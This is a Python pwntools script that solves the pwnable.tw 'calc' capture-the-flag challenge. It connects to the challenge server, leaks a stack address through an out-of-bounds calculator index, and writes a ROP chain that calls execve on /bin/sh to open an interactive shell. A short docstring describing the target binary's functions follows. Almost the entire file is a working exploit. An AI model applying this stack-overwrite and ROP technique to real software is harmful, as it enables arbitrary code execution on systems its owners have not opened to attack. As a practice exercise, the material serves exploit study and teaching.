from pwn import *

context.update(os = 'linux', arch='i386')
pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
syscall = 0x0806441d

payloads = [pop_eax, 0xb, pop_edx_ecx_ebx, 0x0, 0x0, 0x0, 0x08049a21, 0x6e69622f, 0x0068732f] # payloads[5] is address of /bin/sh, need to update later
# r = process('./calc')
r = remote('chall.pwnable.tw', 10100)

def leak_prev_ebp():
    r.sendlineafter('===\n', '+360')
    prev_ebp = int(r.recv(1024))
    payloads[5] = prev_ebp    

# offset 361 = ret
def build_rop():
    stack_offset = 360
    for payload in payloads:
        stack_offset += 1
        r.sendline('+%d' % stack_offset)
        leak = int(r.recv(1024))
        gadget_offset = payload - leak
        r.sendline('+%s%+d' % (stack_offset, gadget_offset))
        gadget = r.recv(1024)
        log.info('+%s'%stack_offset)
        log.info('leak: %s'%hex(leak))
        log.info('gadget: %s'%hex(int(gadget)))
    r.send('\n')
    r.interactive()

def solve():
    leak_prev_ebp()
    build_rop()

if __name__ == '__main__':
    solve()


"""
functions:
    get_expr: loop through the user's input and check every character whether it is digit, +, -, /, * or not. If not exit the program
    init_pool: create an array length 100 with NULL value
    bzero: erase data in n bytes of the memory by write NULL to it
    parse_zero: 
            
tests:
can not calculate with a single "0" =>  return "prevent division by zero"
can not calculate when the last character is symbol => return "expression error!"

"""

